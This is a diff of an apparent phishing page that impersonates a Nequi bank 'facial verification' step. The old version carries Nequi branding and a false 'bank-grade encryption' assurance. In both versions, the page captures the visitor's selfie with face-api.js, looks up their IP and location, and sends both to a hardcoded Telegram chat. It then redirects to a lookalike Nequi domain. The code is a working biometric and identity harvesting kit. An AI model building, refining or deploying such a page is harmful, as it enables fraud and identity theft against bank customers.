@@ -2,365 +2,69 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Verificación Facial - Nequi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
 
 <style>
-* {
-    user-select: none;
-    -webkit-tap-highlight-color: transparent;
-}
-
 body {
-    font-family: 'Inter', Arial, sans-serif;
-    background: linear-gradient(135deg, #2E0039 0%, #4A148C 100%);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
     margin: 0;
-    padding: 15px;
-}
-
-.container {
-    background: white;
-    padding: 25px;
-    border-radius: 20px;
-    width: 380px;
-    text-align: center;
-    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-    border: 1px solid rgba(218,0,129,0.3);
-}
-
-.header-nequi {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 20px;
-}
-
-.nequi-logo {
-    background: #2E0039;
-    color: white;
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    font-size: 18px;
-}
-
-.nequi-text {
-    font-size: 22px;
-    font-weight: bold;
-    color: #2E0039;
-}
-
-.step-indicator {
-    display: flex;
-    justify-content: center;
-    margin: 20px 0;
-}
-
-.step-dot {
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    background: #e0e0e0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 18px;
-    font-weight: bold;
-    color: #666;
-    transition: all 0.3s ease;
-}
-
-.step-dot.active {
-    background: #2E0039;
-    color: white;
-    animation: pulse 1s infinite;
-}
-
-.step-dot.completed {
-    background: #00C853;
-    color: white;
-}
-
-@keyframes pulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.1); }
-}
-
-.step-text {
-    font-size: 16px;
-    font-weight: 600;
-    color: #2E0039;
-    margin-bottom: 15px;
-    padding: 10px;
-    background: #F9F3FF;
-    border-radius: 8px;
-}
-
-.video-container {
-    background: #f0f0f0;
-    border-radius: 12px;
+    background: #2b002b;
     overflow: hidden;
-    margin-bottom: 15px;
-    border: 2px solid #2E0039;
-    position: relative;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 }
 
 video {
-    width: 100%;
-    border-radius: 8px;
-    display: block;
-    transform: scaleX(-1);
-}
-
-.camera-controls {
-    display: flex;
-    gap: 10px;
-    margin-bottom: 10px;
-}
-
-.camera-btn {
-    flex: 1;
-    padding: 10px;
-    border: none;
-    border-radius: 8px;
-    background: #6c757d;
-    color: white;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s ease;
-}
-
-.camera-btn:hover {
-    background: #5a6268;
-}
-
-.camera-btn.active {
-    background: #2E0039;
-}
-
-.camera-btn:disabled {
-    background: #cccccc;
-    cursor: not-allowed;
-}
-
-button {
-    margin-top: 12px;
-    padding: 14px;
-    width: 100%;
-    border: none;
-    border-radius: 12px;
-    background: #2E0039;
-    color: white;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s ease;
-}
-
-button:hover {
-    background: #da0081;
-    transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(218,0,129,0.3);
-}
-
-button:disabled {
-    background: #cccccc;
-    cursor: not-allowed;
-    transform: none;
-}
-
-.preview-section {
-    margin-top: 15px;
-    border-top: 1px solid #e0e0e0;
-    padding-top: 15px;
-}
-
-.preview-title {
-    font-size: 14px;
-    color: #666;
-    margin-bottom: 10px;
-}
-
-.preview-container {
-    display: flex;
-    gap: 10px;
-    overflow-x: auto;
-    padding: 5px 0;
-    justify-content: center;
-}
-
-.preview-item {
-    flex: 0 0 100px;
-    text-align: center;
-}
-
-.preview-item img {
-    width: 100px;
-    height: 100px;
-    border-radius: 8px;
-    object-fit: cover;
-    border: 2px solid #2E0039;
-}
-
-.preview-label {
-    font-size: 11px;
-    color: #666;
-    margin-top: 5px;
-}
-
-.status-message {
-    margin-top: 15px;
-    padding: 12px;
-    border-radius: 8px;
-    font-size: 14px;
-    display: none;
-}
-
-.status-message.success {
-    background: #d4edda;
-    color: #155724;
-    border: 1px solid #c3e6cb;
-    display: block;
-}
-
-.status-message.error {
-    background: #f8d7da;
-    color: #721c24;
-    border: 1px solid #f5c6cb;
-    display: block;
-}
-
-.status-message.info {
-    background: #d1ecf1;
-    color: #0c5460;
-    border: 1px solid #bee5eb;
-    display: block;
-}
-
-.footer-note {
-    margin-top: 15px;
-    font-size: 11px;
-    color: #999;
-}
-
-.loader {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
+    position: absolute;
     width: 100%;
     height: 100%;
-    background: rgba(255,255,255,0.95);
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    gap: 15px;
+    object-fit: cover;
 }
 
-.loader.active {
-    display: flex;
+/* Overlay */
+.overlay {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    background: rgba(43,0,43,0.5);
+    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
+    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
 }
 
-.loader-spinner {
-    width: 50px;
-    height: 50px;
-    border: 5px solid #f3f3f3;
-    border-top: 5px solid #2E0039;
+/* Óvalo */
+.oval {
+    position: absolute;
+    width: 300px;
+    height: 420px;
     border-radius: 50%;
-    animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-.loader-text {
-    color: #2E0039;
-    font-weight: 600;
-}
-
-.botones-accion {
-    display: flex;
-    gap: 10px;
-    margin-top: 15px;
-}
-
-.btn-secondary {
-    background: #6c757d;
-}
-
-.btn-secondary:hover {
-    background: #5a6268;
-}
-
-.camera-indicator {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background: rgba(0,0,0,0.7);
-    color: white;
-    padding: 4px 8px;
-    border-radius: 20px;
-    font-size: 11px;
-    z-index: 10;
-}
-
-.face-indicator {
-    position: absolute;
-    bottom: 10px;
-    left: 10px;
-    right: 10px;
-    background: rgba(0,0,0,0.7);
-    color: white;
-    padding: 8px;
-    border-radius: 20px;
-    font-size: 12px;
-    z-index: 10;
-    text-align: center;
-}
-
-.guide-oval {
-    position: absolute;
+    border: 4px solid white;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 240px;
-    height: 300px;
-    border-radius: 50%;
-    border: 3px solid rgba(255, 255, 255, 0.9);
-    pointer-events: none;
-    z-index: 5;
-    transition: all 0.2s ease;
-    box-shadow: 0 0 0 2px rgba(255,255,255,0.3), inset 0 0 0 2px rgba(255,255,255,0.3);
+    transition: 0.2s;
 }
 
-.guide-oval.valid {
+.valid {
     border-color: #00ff88;
-    box-shadow: 0 0 20px #00ff88, 0 0 0 2px rgba(0,255,136,0.5);
+    box-shadow: 0 0 25px #00ff88;
 }
 
-.guide-oval.eyes-closed {
-    border-color: #ff6b6b;
-    box-shadow: 0 0 20px #ff6b6b;
+/* Texto */
+.status {
+    position: absolute;
+    bottom: 30px;
+    width: 100%;
+    text-align: center;
+    color: white;
+    font-size: 18px;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+    z-index: 10;
 }
 
+/* Barra de progreso */
 .progress-container {
     position: absolute;
-    bottom: 60px;
+    bottom: 100px;
     left: 50%;
     transform: translateX(-50%);
     width: 200px;
@@ -379,89 +83,226 @@ button:disabled {
     border-radius: 2px;
 }
 
-@keyframes pulse-animation {
-    0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    50% { transform: translate(-50%, -50%) scale(1.02); opacity: 0.9; }
+/* Preview de foto */
+.photo-preview {
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 100px;
+    height: 100px;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 3px solid #00ff88;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    z-index: 20;
+    background: white;
+    animation: slideIn 0.3s ease;
+    cursor: pointer;
 }
 
-.pulse-animation {
-    animation: pulse-animation 0.5s ease;
+.photo-preview img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.photo-preview .delete-btn {
+    position: absolute;
+    top: -8px;
+    right: -8px;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: red;
+    color: white;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: bold;
+}
+
+@keyframes slideIn {
+    from {
+        opacity: 0;
+        transform: translateX(100px);
+    }
+    to {
+        opacity: 1;
+        transform: translateX(0);
+    }
+}
+
+/* Botón de reinicio */
+.reset-btn {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(5px);
+    color: white;
+    border: 1px solid rgba(255,255,255,0.3);
+    padding: 10px 20px;
+    border-radius: 25px;
+    cursor: pointer;
+    font-size: 14px;
+    z-index: 20;
+    transition: all 0.2s;
+    font-family: monospace;
+}
+
+.reset-btn:hover {
+    background: rgba(255,255,255,0.2);
+    transform: scale(1.05);
+}
+
+/* Botón de enviar */
+.send-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: rgba(0,255,136,0.9);
+    backdrop-filter: blur(5px);
+    color: #2b002b;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 25px;
+    cursor: pointer;
+    font-size: 14px;
+    z-index: 20;
+    transition: all 0.2s;
+    font-weight: bold;
+    display: none;
+}
+
+.send-btn:hover {
+    background: #00ff88;
+    transform: scale(1.05);
+}
+
+/* Loader */
+.loader {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 15px;
+}
+
+.loader.active {
+    display: flex;
+}
+
+.loader-spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #00ff88;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loader-text {
+    color: white;
+    font-weight: 600;
+}
+
+/* Toast de éxito */
+.success-toast {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(0,255,136,0.95);
+    color: #2b002b;
+    padding: 20px 40px;
+    border-radius: 50px;
+    font-size: 24px;
+    font-weight: bold;
+    z-index: 30;
+    animation: fadeInOut 1.5s ease;
+    pointer-events: none;
+    white-space: nowrap;
+}
+
+@keyframes fadeInOut {
+    0% {
+        opacity: 0;
+        transform: translate(-50%, -50%) scale(0.8);
+    }
+    15% {
+        opacity: 1;
+        transform: translate(-50%, -50%) scale(1);
+    }
+    85% {
+        opacity: 1;
+        transform: translate(-50%, -50%) scale(1);
+    }
+    100% {
+        opacity: 0;
+        transform: translate(-50%, -50%) scale(0.8);
+    }
+}
+
+/* Mensaje de estado adicional */
+.status-message {
+    position: fixed;
+    bottom: 120px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,0,0,0.8);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 20px;
+    font-size: 12px;
+    z-index: 10;
+    display: none;
+    white-space: nowrap;
 }
 </style>
 </head>
 
 <body>
 
+<video id="video" autoplay muted playsinline></video>
+<div class="overlay"></div>
+<div class="oval" id="oval"></div>
+<div class="status" id="status">🎯 Iniciando cámara...</div>
+<div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+</div>
+<button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
+<button class="send-btn" id="sendBtn">📤 Enviar a Telegram</button>
+<div class="status-message" id="statusMessage"></div>
 <div class="loader" id="loader">
     <div class="loader-spinner"></div>
     <div class="loader-text" id="loaderText">Procesando...</div>
 </div>
 
-<div class="container">
-    <div class="header-nequi">
-        <div class="nequi-logo">NQ</div>
-        <div class="nequi-text">Nequi - Verificación Facial</div>
-    </div>
-
-    <div class="step-indicator">
-        <div class="step-dot active" id="stepDot">1</div>
-    </div>
-
-    <div class="step-text" id="stepText">
-        📸 Toma una selfie con los ojos abiertos
-    </div>
-
-    <div class="camera-controls">
-        <button class="camera-btn active" id="btnFrontal">🤳 Selfie</button>
-    </div>
-
-    <div class="video-container" style="position: relative;">
-        <video id="video" autoplay playsinline muted></video>
-        <div class="camera-indicator" id="cameraIndicator">🤳 Cámara frontal</div>
-        <div class="face-indicator" id="faceIndicator">👤 Detectando rostro...</div>
-        <div class="guide-oval" id="guideOval"></div>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-    </div>
-
-    <button onclick="capturarConValidacion()" id="captureBtn">
-        Capturar selfie
-    </button>
-
-    <div class="preview-section" id="previewSection" style="display:none;">
-        <div class="preview-title">Selfie capturada:</div>
-        <div class="preview-container" id="previewContainer"></div>
-    </div>
-
-    <div class="botones-accion" id="actionButtons" style="display:none;">
-        <button class="btn-secondary" onclick="reiniciar()">Tomar otra</button>
-        <button onclick="enviarSelfie()">Enviar verificación</button>
-    </div>
-
-    <div class="status-message" id="statusMessage"></div>
-
-    <div class="footer-note">
-        🔒 Tus datos están seguros con encriptación de grado bancario
-    </div>
-</div>
-
 <script>
 const video = document.getElementById("video");
-const stepText = document.getElementById("stepText");
-const captureBtn = document.getElementById("captureBtn");
-const previewSection = document.getElementById("previewSection");
-const previewContainer = document.getElementById("previewContainer");
-const actionButtons = document.getElementById("actionButtons");
+const oval = document.getElementById("oval");
+const statusText = document.getElementById("status");
+const progressBar = document.getElementById("progressBar");
+const resetBtn = document.getElementById("resetBtn");
+const sendBtn = document.getElementById("sendBtn");
 const statusMessage = document.getElementById("statusMessage");
 const loader = document.getElementById("loader");
 const loaderText = document.getElementById("loaderText");
-const btnFrontal = document.getElementById("btnFrontal");
-const cameraIndicator = document.getElementById("cameraIndicator");
-const faceIndicator = document.getElementById("faceIndicator");
-const guideOval = document.getElementById("guideOval");
-const stepDot = document.getElementById("stepDot");
-const progressBar = document.getElementById("progressBar");
 
 // Configuración de Telegram
 const TELEGRAM_CONFIG = {
@@ -469,264 +310,148 @@ const TELEGRAM_CONFIG = {
     chatId: "7776240161"
 };
 
-let streamActual = null;
-let faceApiLoaded = false;
-let deteccionActiva = false;
-let ultimoResultado = null;
-let selfieTomada = false;
-let imagenSelfie = null;
 let countdown = null;
 let stableFrames = 0;
 let photoTaken = false;
+let currentPhotoData = null;
 
+// Configuración
 const REQUIRED_FRAMES = 8;
-const TOLERANCIA_X = 70;
-const TOLERANCIA_Y = 90;
+const TOLERANCIA_X = 90;
+const TOLERANCIA_Y = 130;
+
+// Iniciar cámara
+navigator.mediaDevices.getUserMedia({ 
+    video: { 
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        facingMode: "user"
+    } 
+})
+.then(stream => {
+    video.srcObject = stream;
+    statusText.innerText = "📷 Coloca tu rostro en el óvalo";
+})
+.catch(err => {
+    console.error("Error de cámara:", err);
+    statusText.innerText = "❌ Error: No se puede acceder a la cámara";
+});
 
 // Cargar modelos de Face-API
-async function cargarModelosFaceAPI() {
-    try {
-        faceIndicator.textContent = "📦 Cargando modelos de IA...";
-        await Promise.all([
-            faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models'),
-            faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models')
-        ]);
-        faceApiLoaded = true;
-        faceIndicator.textContent = "✅ IA lista - Coloca tu rostro en el óvalo";
-        iniciarDeteccionFacial();
-    } catch (error) {
-        console.error("Error cargando modelos:", error);
-        faceIndicator.textContent = "⚠️ IA no disponible - Captura manual";
-    }
-}
+Promise.all([
+    faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models'),
+    faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models')
+]).then(() => {
+    statusText.innerText = "✅ Cámara lista - Coloca tu rostro en el óvalo";
+    startValidation();
+}).catch(err => {
+    console.error("Error cargando modelos:", err);
+    statusText.innerText = "❌ Error cargando IA. Recarga la página.";
+});
 
-// Iniciar detección facial continua
-function iniciarDeteccionFacial() {
-    if (deteccionActiva) return;
-    deteccionActiva = true;
-    
+function startValidation() {
     setInterval(async () => {
-        if (!faceApiLoaded || !video.videoWidth || selfieTomada) {
-            return;
-        }
+        if (photoTaken || !video.videoWidth) return;
         
         try {
-            const result = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
+            const result = await faceapi
+                .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
+                .withFaceLandmarks();
             
             if (!result) {
-                faceIndicator.textContent = "❌ No se detecta rostro";
-                guideOval.classList.remove('valid', 'eyes-closed');
-                ultimoResultado = null;
-                stableFrames = 0;
-                progressBar.style.width = "0%";
+                reset("❌ No se detecta rostro");
                 return;
             }
             
-            // Detectar ojos abiertos
-            const landmarks = result.landmarks;
-            const leftEye = landmarks.getLeftEye();
-            const rightEye = landmarks.getRightEye();
-            
-            function eyeOpen(eye) {
-                if (!eye || eye.length < 6) return false;
-                const height1 = Math.abs(eye[1].y - eye[5].y);
-                const height2 = Math.abs(eye[2].y - eye[4].y);
-                const avgHeight = (height1 + height2) / 2;
-                const width = Math.abs(eye[0].x - eye[3].x);
-                const ratio = avgHeight / width;
-                return ratio > 0.25;
-            }
-            
-            const ojosAbiertos = eyeOpen(leftEye) && eyeOpen(rightEye);
-            
-            // Verificar centrado en el óvalo
+            // Escalar coordenadas
             const rect = video.getBoundingClientRect();
             const scaleX = rect.width / video.videoWidth;
             const scaleY = rect.height / video.videoHeight;
+            
             const box = result.detection.box;
             const faceX = (box.x + box.width / 2) * scaleX;
             const faceY = (box.y + box.height / 2) * scaleY;
             
-            const ovalRect = guideOval.getBoundingClientRect();
+            const ovalRect = oval.getBoundingClientRect();
             const centerX = ovalRect.left + ovalRect.width / 2;
             const centerY = ovalRect.top + ovalRect.height / 2;
             
             const dx = Math.abs(faceX - centerX);
             const dy = Math.abs(faceY - centerY);
-            const centrado = dx < TOLERANCIA_X && dy < TOLERANCIA_Y;
             
-            if (ojosAbiertos && centrado) {
-                faceIndicator.textContent = "✅ Rostro centrado - Ojos abiertos";
-                guideOval.classList.add('valid');
-                guideOval.classList.remove('eyes-closed');
-                ultimoResultado = { valido: true, ojosAbiertos: true };
-                
+            // Detección de ojos abiertos
+            const landmarks = result.landmarks;
+            const leftEye = landmarks.getLeftEye();
+            const rightEye = landmarks.getRightEye();
+            
+            function eyeOpen(eye) {
+                const height = Math.abs(eye[1].y - eye[5].y);
+                const width = Math.abs(eye[0].x - eye[3].x);
+                return (height / width) > 0.25;
+            }
+            
+            const eyesOpen = eyeOpen(leftEye) && eyeOpen(rightEye);
+            const inside = dx < TOLERANCIA_X && dy < TOLERANCIA_Y;
+            
+            if (inside && eyesOpen) {
+                oval.classList.add("valid");
                 stableFrames++;
+                
+                // Actualizar barra de progreso
                 const progress = (stableFrames / REQUIRED_FRAMES) * 100;
                 progressBar.style.width = `${progress}%`;
                 
-                if (stableFrames >= REQUIRED_FRAMES && !countdown && !selfieTomada) {
+                if (stableFrames >= REQUIRED_FRAMES && !countdown && !photoTaken) {
                     startCountdown();
+                } else {
+                    statusText.innerText = `✅ Rostro correcto (${stableFrames}/${REQUIRED_FRAMES})`;
                 }
-            } else if (!ojosAbiertos) {
-                faceIndicator.textContent = "👁️ Por favor, abre los ojos";
-                guideOval.classList.add('eyes-closed');
-                guideOval.classList.remove('valid');
-                ultimoResultado = { valido: false, ojosAbiertos: false };
-                stableFrames = 0;
-                progressBar.style.width = "0%";
-            } else if (!centrado) {
-                faceIndicator.textContent = "🎯 Centra tu rostro en el óvalo";
-                guideOval.classList.remove('valid', 'eyes-closed');
-                ultimoResultado = { valido: false, ojosAbiertos: true };
+            } else {
+                if (!eyesOpen) {
+                    reset("👁️ Abre los ojos");
+                } else if (!inside) {
+                    let msg = "";
+                    if (dx > TOLERANCIA_X && dy > TOLERANCIA_Y) msg = "⬅️⬆️ Centra tu rostro";
+                    else if (dx > TOLERANCIA_X) msg = "⬅️➡️ Centra horizontalmente";
+                    else if (dy > TOLERANCIA_Y) msg = "⬆️⬇️ Centra verticalmente";
+                    else msg = "🎯 Centra tu rostro en el óvalo";
+                    reset(msg);
+                } else {
+                    reset("⚠️ Mantén tu rostro estable");
+                }
+                oval.classList.remove("valid");
                 stableFrames = 0;
                 progressBar.style.width = "0%";
             }
-            
-        } catch (error) {
-            console.error("Error en detección facial:", error);
+        } catch (err) {
+            console.error("Error en detección:", err);
         }
     }, 150);
 }
 
 function startCountdown() {
-    if (countdown || selfieTomada) return;
+    if (countdown) return;
     
     let t = 3;
-    faceIndicator.textContent = "📸 ¡No te muevas! (" + t + ")";
+    statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
     
     countdown = setInterval(() => {
         t--;
         
         if (t > 0) {
-            faceIndicator.textContent = "📸 ¡No te muevas! (" + t + ")";
+            statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
         } else {
             clearInterval(countdown);
             countdown = null;
-            capturarSelfie();
+            takePhoto();
         }
     }, 1000);
 }
 
-// Función para iniciar cámara
-async function iniciarCamara() {
-    try {
-        if (streamActual) {
-            streamActual.getTracks().forEach(track => track.stop());
-        }
-        
-        const constraints = {
-            video: {
-                width: { ideal: 640 },
-                height: { ideal: 480 },
-                facingMode: "user"
-            }
-        };
-        
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-        streamActual = stream;
-        
-        video.style.transform = 'scaleX(-1)';
-        cameraIndicator.textContent = '🤳 Cámara frontal';
-        btnFrontal.classList.add('active');
-        
-    } catch (error) {
-        console.error("Error al acceder a la cámara:", error);
-        mostrarError("No se pudo acceder a la cámara. Verifica los permisos.");
-    }
-}
-
-function mostrarError(mensaje) {
-    statusMessage.textContent = mensaje;
-    statusMessage.className = 'status-message error';
-    statusMessage.style.display = 'block';
-    setTimeout(() => {
-        statusMessage.style.display = 'none';
-    }, 3000);
-}
-
-function mostrarExito(mensaje) {
-    statusMessage.textContent = mensaje;
-    statusMessage.className = 'status-message success';
-    statusMessage.style.display = 'block';
-}
-
-function capturarConValidacion() {
-    if (selfieTomada) {
-        mostrarError("Ya has tomado una selfie");
-        return;
-    }
-    
-    if (!ultimoResultado || !ultimoResultado.valido) {
-        if (ultimoResultado && !ultimoResultado.ojosAbiertos) {
-            mostrarError("Abre bien los ojos para la selfie");
-        } else {
-            mostrarError("Centra tu rostro en el óvalo antes de capturar");
-        }
-        guideOval.classList.add('pulse-animation');
-        setTimeout(() => guideOval.classList.remove('pulse-animation'), 500);
-        return;
-    }
-    
-    if (!countdown) {
-        startCountdown();
-    }
-}
-
-function capturarSelfie() {
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    const ctx = canvas.getContext("2d");
-    
-    // Aplicar espejo para selfie
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-    
-    imagenSelfie = canvas.toDataURL("image/jpeg", 0.9);
-    selfieTomada = true;
-    photoTaken = true;
-    
-    // Mostrar preview
-    agregarPreview('Selfie', imagenSelfie);
-    previewSection.style.display = 'block';
-    
-    stepText.innerText = "✅ Selfie capturada correctamente";
-    stepDot.classList.add('completed');
-    stepDot.style.background = "#00C853";
-    stepDot.innerHTML = "✓";
-    captureBtn.style.display = 'none';
-    actionButtons.style.display = 'flex';
-    faceIndicator.textContent = "✅ Selfie lista para enviar";
-    
-    mostrarExito("✅ Selfie capturada correctamente");
-}
-
-function agregarPreview(tipo, imagenData) {
-    previewContainer.innerHTML = '';
-    const previewItem = document.createElement('div');
-    previewItem.className = 'preview-item';
-    
-    const img = document.createElement('img');
-    img.src = imagenData;
-    
-    const label = document.createElement('div');
-    label.className = 'preview-label';
-    label.textContent = tipo;
-    
-    previewItem.appendChild(img);
-    previewItem.appendChild(label);
-    previewContainer.appendChild(previewItem);
-}
-
-function reiniciar() {
-    selfieTomada = false;
-    imagenSelfie = null;
-    photoTaken = false;
+function reset(msg) {
+    if (photoTaken) return;
+    statusText.innerText = msg;
+    oval.classList.remove("valid");
     stableFrames = 0;
     progressBar.style.width = "0%";
     
@@ -734,22 +459,86 @@ function reiniciar() {
         clearInterval(countdown);
         countdown = null;
     }
+}
+
+// Tomar foto
+function takePhoto() {
+    if (photoTaken) return;
+    photoTaken = true;
     
-    previewSection.style.display = 'none';
-    previewContainer.innerHTML = '';
-    actionButtons.style.display = 'none';
-    captureBtn.style.display = 'block';
-    stepText.innerText = "📸 Toma una selfie con los ojos abiertos";
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
     
-    stepDot.classList.remove('completed');
-    stepDot.style.background = "#e0e0e0";
-    stepDot.innerHTML = "1";
-    stepDot.classList.add('active');
+    const ctx = canvas.getContext("2d");
+    // Aplicar espejo para selfie
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
     
-    statusMessage.style.display = 'none';
-    faceIndicator.textContent = "✅ IA lista - Coloca tu rostro en el óvalo";
-    guideOval.classList.remove('valid', 'eyes-closed');
-    ultimoResultado = null;
+    currentPhotoData = canvas.toDataURL("image/png");
+    
+    showSuccessToast();
+    statusText.innerText = "✅ ¡Selfie capturada con éxito!";
+    
+    createPhotoPreview(currentPhotoData);
+    sendBtn.style.display = "block";
+}
+
+function showSuccessToast() {
+    const toast = document.createElement('div');
+    toast.className = 'success-toast';
+    toast.textContent = '📸 ¡Selfie capturada!';
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.remove();
+    }, 1500);
+}
+
+function createPhotoPreview(imgData) {
+    const existingPreview = document.querySelector('.photo-preview');
+    if (existingPreview) existingPreview.remove();
+    
+    const preview = document.createElement('div');
+    preview.className = 'photo-preview';
+    
+    const img = document.createElement('img');
+    img.src = imgData;
+    
+    const deleteBtn = document.createElement('button');
+    deleteBtn.className = 'delete-btn';
+    deleteBtn.textContent = '×';
+    deleteBtn.onclick = (e) => {
+        e.stopPropagation();
+        preview.remove();
+        sendBtn.style.display = "none";
+        photoTaken = false;
+        currentPhotoData = null;
+        reset("🎯 Reiniciado - Coloca tu rostro");
+        oval.classList.remove("valid");
+        progressBar.style.width = "0%";
+        statusText.innerText = "✅ Listo para nueva selfie";
+        setTimeout(() => {
+            statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
+        }, 2000);
+    };
+    
+    preview.appendChild(img);
+    preview.appendChild(deleteBtn);
+    
+    document.body.appendChild(preview);
+}
+
+function mostrarMensaje(mensaje, esError = false) {
+    statusMessage.textContent = mensaje;
+    statusMessage.style.backgroundColor = esError ? 'rgba(255,0,0,0.8)' : 'rgba(0,255,136,0.9)';
+    statusMessage.style.color = esError ? 'white' : '#2b002b';
+    statusMessage.style.display = 'block';
+    setTimeout(() => {
+        statusMessage.style.display = 'none';
+    }, 3000);
 }
 
 function dataURLtoBlob(dataURL) {
@@ -764,21 +553,22 @@ function dataURLtoBlob(dataURL) {
     return new Blob([u8arr], { type: mime });
 }
 
-async function enviarSelfie() {
-    if (!imagenSelfie) {
-        mostrarError("No hay selfie para enviar");
+async function enviarATelegram() {
+    if (!currentPhotoData) {
+        mostrarMensaje("No hay foto para enviar", true);
         return;
     }
     
     loader.classList.add('active');
     loaderText.textContent = "Enviando verificación...";
-    statusMessage.style.display = 'none';
     
     try {
+        // Obtener IP y ubicación
         const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
         
+        // Enviar la selfie
         loaderText.textContent = "Enviando selfie...";
-        const blob = dataURLtoBlob(imagenSelfie);
+        const blob = dataURLtoBlob(currentPhotoData);
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CONFIG.chatId);
         formData.append('caption', `🤳 Selfie Verificada - ${new Date().toLocaleString('es-CO')}`);
@@ -789,6 +579,7 @@ async function enviarSelfie() {
             body: formData
         });
         
+        // Enviar mensaje con información adicional
         const mensajeInfo = `
 🔔 **VERIFICACIÓN FACIAL COMPLETADA** 🔔
 
@@ -820,10 +611,12 @@ async function enviarSelfie() {
         });
         
         loader.classList.remove('active');
-        mostrarExito("✅ Verificación enviada correctamente");
+        mostrarMensaje("✅ Verificación enviada correctamente");
         
-        actionButtons.style.display = 'none';
+        // Deshabilitar botón de enviar
+        sendBtn.style.display = 'none';
         
+        // Redirigir después de 3 segundos
         setTimeout(() => {
             window.location.href = 'https://nequi-red.vercel.app/';
         }, 3000);
@@ -831,15 +624,38 @@ async function enviarSelfie() {
     } catch (error) {
         console.error('Error enviando a Telegram:', error);
         loader.classList.remove('active');
-        mostrarError("Error al enviar la verificación. Intenta nuevamente.");
-        actionButtons.style.display = 'flex';
+        mostrarMensaje("Error al enviar la verificación. Intenta nuevamente.", true);
     }
 }
 
-// Inicializar
-document.addEventListener('DOMContentLoaded', () => {
-    iniciarCamara();
-    cargarModelosFaceAPI();
+// Botón de reinicio
+resetBtn.addEventListener('click', () => {
+    if (countdown) {
+        clearInterval(countdown);
+        countdown = null;
+    }
+    
